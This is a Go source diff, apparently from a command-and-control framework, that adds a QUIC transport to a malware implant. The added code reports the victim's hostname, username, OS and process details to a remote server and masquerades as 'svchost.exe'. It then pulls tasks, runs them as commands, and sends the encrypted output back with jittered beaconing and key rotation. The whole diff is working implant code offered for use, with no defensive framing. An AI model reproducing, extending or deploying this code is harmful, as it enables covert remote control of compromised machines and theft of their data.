@@ -34,6 +34,7 @@ package main
 
 import (
 	"bytes"
+	"context" 
 	"crypto/ecdh"
 	"crypto/rand"
 	"crypto/tls"
@@ -44,6 +45,7 @@ import (
 	"fmt"
 	"io"
 	"math/big"
+	"net"
 	"net/http"
 	"net/url"
 	"os"
@@ -53,6 +55,7 @@ import (
 	"time"
 
 	"github.com/miekg/dns"
+	"github.com/quic-go/quic-go" 
 	"github.com/uLl0a/lavianc2/internal/crypto"
 	"github.com/uLl0a/lavianc2/internal/profiles"
 	"github.com/uLl0a/lavianc2/internal/protocol"
@@ -119,6 +122,8 @@ func main() {
 		runDNS()
 	case "http", "https":
 		runHTTP()
+	case "quic":
+		runQUIC()
 	default:
 		fatalExit("esquema no soportado: "+u.Scheme, nil)
 	}
@@ -389,6 +394,309 @@ func beaconHTTP(profile *profiles.Profile, implantID string, sc *crypto.SessionC
 		debugLog("beacon: resultado %s enviado, HTTP %d", t.ID, resp2.StatusCode)
 	}
 
+	return nil
+}
+
+// ════════════════════════════════════════════════════════════════════
+// Transporte QUIC
+// ════════════════════════════════════════════════════════════════════
+
+func newQUICTLSConfig() (*tls.Config, error) {
+	caPEM, err := base64.StdEncoding.DecodeString(CACertPEMBase64)
+	if err != nil {
+		return nil, fmt.Errorf("decodificar CA: %w", err)
+	}
+	pool := x509.NewCertPool()
+	if !pool.AppendCertsFromPEM(caPEM) {
+		return nil, fmt.Errorf("CA PEM inválida")
+	}
+	return &tls.Config{
+		RootCAs:    pool,
+		MinVersion: tls.VersionTLS13,
+		// ServerName lo rellena el caller con el host del ListenerURL.
+	}, nil
+}
+
+// quicHostFromURL extrae "host:port" del ListenerURL (esquema quic://).
+func quicHostFromURL() (string, error) {
+	u, err := url.Parse(ListenerURL)
+	if err != nil {
+		return "", err
+	}
+	if u.Host == "" {
+		return "", fmt.Errorf("quic: listener url sin host")
+	}
+	return u.Host, nil
+}
+
+func runQUIC() {
+	debugLog("modo QUIC, cargando perfil %q", ProfileName)
+	registry := profiles.NewQUICRegistry()
+	profile, err := registry.Get(ProfileName)
+	if err != nil {
+		fatalExit("perfil QUIC no encontrado", err)
+	}
+
+	var (
+		sc        *crypto.SessionCrypto
+		implantID string
+	)
+
+	iteration := 0
+	for {
+		iteration++
+		debugLog("iteración #%d (sc=%v implantID=%q)", iteration, sc != nil, implantID)
+
+		if sc == nil {
+			debugLog("sin sesión, haciendo handshake QUIC")
+			s, id, err := performHandshakeQUIC(profile)
+			if err != nil {
+				debugLog("handshake QUIC falló: %v — reintentando en 30s", err)
+				time.Sleep(30 * time.Second)
+				continue
+			}
+			sc = s
+			implantID = id
+			debugLog("handshake QUIC OK implant_id=%s", implantID)
+		}
+
+		if err := beaconQUIC(profile, implantID, sc); err != nil {
+			debugLog("beacon QUIC falló: %v — reseteando sesión", err)
+			sc = nil
+			implantID = ""
+		}
+
+		sleepWithJitter()
+	}
+}
+
+func performHandshakeQUIC(profile *profiles.QUICProfile) (*crypto.SessionCrypto, string, error) {
+	priv, pub, err := crypto.GenerateKeyPair()
+	if err != nil {
+		return nil, "", err
+	}
+
+	hostname, _ := os.Hostname()
+	sessionKey := randomSessionKey()
+	debugLog("quic handshake: session_key=%s hostname=%s", sessionKey, hostname)
+
+	req := map[string]any{
+		"session_key": sessionKey,
+		"hostname":    hostname,
+		"username":    os.Getenv("USERNAME"),
+		"os":          runtime.GOOS,
+		"arch":        runtime.GOARCH,
+		"pid":         os.Getpid(),
+		"process":     "svchost.exe",
+		"public_key":  base64.StdEncoding.EncodeToString(pub.Bytes()),
+	}
+	payload, _ := json.Marshal(req)
+	env := protocol.NewEnvelope(protocol.MsgCheckin, payload)
+
+	respEnv, err := exchangeQUIC(profile, env)
+	if err != nil {
+		return nil, "", err
+	}
+
+	var checkinResp struct {
+		ServerPub string ` + "`json:\"server_pub\"`" + `
+		SessionID string ` + "`json:\"implant_id\"`" + `
+		Sleep     int    ` + "`json:\"sleep\"`" + `
+		Jitter    int    ` + "`json:\"jitter\"`" + `
+	}
+	if err := json.Unmarshal(respEnv.Payload, &checkinResp); err != nil {
+		return nil, "", err
+	}
+	debugLog("quic handshake: server_pub=%s implant_id=%s sleep=%d jitter=%d",
+		truncate(checkinResp.ServerPub, 16), checkinResp.SessionID,
+		checkinResp.Sleep, checkinResp.Jitter)
+
+	serverPub, err := decodeServerPub(checkinResp.ServerPub)
+	if err != nil {
+		return nil, "", err
+	}
+	if err := verifyServerPubKey(serverPub); err != nil {
+		return nil, "", fmt.Errorf("pinning falló: %w", err)
+	}
+	debugLog("quic handshake: pinning OK")
+
+	sc, err := crypto.NewSessionCryptoAsBeacon(priv, serverPub, sessionKey)
+	if err != nil {
+		return nil, "", err
+	}
+	debugLog("quic handshake: claves derivadas OK")
+
+	if checkinResp.Sleep > 0 {
+		sleepSecs = checkinResp.Sleep
+	}
+	if checkinResp.Jitter > 0 {
+		jitterPerc = checkinResp.Jitter
+	}
+
+	return sc, checkinResp.SessionID, nil
+}
+
+func beaconQUIC(profile *profiles.QUICProfile, implantID string, sc *crypto.SessionCrypto) error {
+	empty, _ := json.Marshal(map[string]any{})
+	encEmpty, err := sc.EncryptForC2(empty, nil)
+	if err != nil {
+		return err
+	}
+	wrapper := protocol.EncryptedWrapper{ImplantID: implantID, Data: encEmpty}
+	pollPayload, _ := json.Marshal(wrapper)
+	env := protocol.NewEnvelope(protocol.MsgTaskPull, pollPayload)
+
+	respEnv, err := exchangeQUIC(profile, env)
+	if err != nil {
+		return err
+	}
+	debugLog("quic beacon: respuesta tipo=%d len=%d", respEnv.Type, len(respEnv.Payload))
+
+	if respEnv.Type == protocol.MsgKeyRotation {
+		debugLog("quic beacon: server pide rekey")
+		return handleRekeyRequestQUIC(profile, implantID, sc, respEnv.Payload)
+	}
+	if respEnv.Type != protocol.MsgTaskDispatch {
+		return fmt.Errorf("respuesta inesperada: %d", respEnv.Type)
+	}
+
+	decrypted, err := sc.DecryptFromC2(respEnv.Payload, nil)
+	if err != nil {
+		return err
+	}
+
+	var tasks []protocol.TaskWire
+	if err := json.Unmarshal(decrypted, &tasks); err != nil {
+		return err
+	}
+	debugLog("quic beacon: %d tareas recibidas", len(tasks))
+
+	for i, t := range tasks {
+		debugLog("quic beacon: tarea %d/%d id=%s cmd=%s", i+1, len(tasks), t.ID, t.Command)
+		output, errMsg := executeTask(t.Command, t.Args)
+		debugLog("quic beacon: tarea %s ejecutada, output=%d bytes err=%q", t.ID, len(output), errMsg)
+
+		result := protocol.TaskResultWire{TaskID: t.ID, Output: output, Error: errMsg}
+		resultJSON, _ := json.Marshal(result)
+		encResult, err := sc.EncryptForC2(resultJSON, nil)
+		if err != nil {
+			continue
+		}
+		wrap := protocol.EncryptedWrapper{ImplantID: implantID, Data: encResult}
+		wrapJSON, _ := json.Marshal(wrap)
+		resEnv := protocol.NewEnvelope(protocol.MsgTaskResult, wrapJSON)
+		_, _ = exchangeQUIC(profile, resEnv)
+		debugLog("quic beacon: resultado %s enviado", t.ID)
+	}
+
+	return nil
+}
+
+// exchangeQUIC abre una conexión QUIC nueva, envía el envelope en un
+// stream, cierra el write side, lee la respuesta hasta EOF, y cierra.
+func exchangeQUIC(profile *profiles.QUICProfile, env *protocol.Envelope) (*protocol.Envelope, error) {
+	host, err := quicHostFromURL()
+	if err != nil {
+		return nil, err
+	}
+
+	tlsCfg, err := newQUICTLSConfig()
+	if err != nil {
+		return nil, err
+	}
+	tlsCfg.NextProtos = profile.ALPN
+	// ServerName = host sin puerto.
+	if h, _, err := net.SplitHostPort(host); err == nil {
+		tlsCfg.ServerName = h
+	} else {
+		tlsCfg.ServerName = host
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+
+	quicCfg := &quic.Config{
+		MaxIdleTimeout:  profile.MaxIdleTimeout,
+		KeepAlivePeriod: profile.KeepAlivePeriod,
+	}
+
+	conn, err := quic.DialAddr(ctx, host, tlsCfg, quicCfg)
+	if err != nil {
+		return nil, fmt.Errorf("quic dial: %w", err)
+	}
+	defer conn.CloseWithError(0, "")
+
+	stream, err := conn.OpenStreamSync(ctx)
+	if err != nil {
+		return nil, fmt.Errorf("quic open stream: %w", err)
+	}
+
+	envBytes, _ := env.Marshal()
+	if _, err := stream.Write(envBytes); err != nil {
+		return nil, fmt.Errorf("quic write: %w", err)
+	}
+	_ = stream.Close() // cierra write side, read sigue abierto
+
+	_ = stream.SetReadDeadline(time.Now().Add(30 * time.Second))
+	respBytes, err := io.ReadAll(stream)
+	if err != nil {
+		return nil, fmt.Errorf("quic read: %w", err)
+	}
+
+	respEnv, err := protocol.UnmarshalEnvelope(respBytes)
+	if err != nil {
+		return nil, fmt.Errorf("quic unmarshal: %w", err)
+	}
+	return respEnv, nil
+}
+
+func handleRekeyRequestQUIC(
+	profile *profiles.QUICProfile,
+	implantID string,
+	sc *crypto.SessionCrypto,
+	encrypted []byte,
+) error {
+	serverEphPub, err := decodeServerEphPub(sc, encrypted)
+	if err != nil {
+		return err
+	}
+
+	ephPriv, ephPub, err := crypto.GenerateKeyPair()
+	if err != nil {
+		return err
+	}
+
+	resp := map[string]string{
+		"implant_eph_pub": base64.StdEncoding.EncodeToString(ephPub.Bytes()),
+	}
+	respJSON, _ := json.Marshal(resp)
+	encResp, err := sc.EncryptForC2(respJSON, nil)
+	if err != nil {
+		return err
+	}
+	wrapper := protocol.EncryptedWrapper{ImplantID: implantID, Data: encResp}
+	wrapJSON, _ := json.Marshal(wrapper)
+	resEnv := protocol.NewEnvelope(protocol.MsgKeyRotation, wrapJSON)
+
+	respEnv, err := exchangeQUIC(profile, resEnv)
+	if err != nil {
+		return err
+	}
+
+	if err := sc.ApplyRekeyAsBeacon(ephPriv, serverEphPub); err != nil {
+		return err
+	}
+	if respEnv.Type != protocol.MsgKeyRotation {
+		return fmt.Errorf("quic rekey: tipo inesperado: %d", respEnv.Type)
+	}
+	ack, err := sc.DecryptFromC2(respEnv.Payload, nil)
+	if err != nil {
+		return fmt.Errorf("quic rekey: descifrar ack: %w", err)
+	}
+	if string(ack) != "ok" {
+		return fmt.Errorf("quic rekey: ack inesperado: %q", ack)
+	}
+	debugLog("rekey QUIC: ack OK, rekey completo")
 	return nil
 }
 
